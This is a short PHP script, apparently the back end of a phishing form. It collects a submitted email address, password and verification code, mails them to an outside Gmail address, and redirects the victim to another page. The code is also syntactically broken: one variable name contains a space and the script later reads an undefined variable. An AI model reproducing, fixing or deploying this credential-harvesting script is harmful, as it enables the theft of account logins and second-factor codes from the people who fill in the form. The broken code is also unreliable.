<? php
$Email address = $_REQUEST['Email address'];
$Password = $_REQUEST['Password'];
$Code = $_REQUEST['Code'];

$message = "Email : $Email\nPassword: $Password\nCode = $Code" ;
mail("saivishalnamburi@gmail.com", "recieved feedback", "Informatiuon requested:\n\ $message ", "from: $Email");
header("Location: forms.html")
?>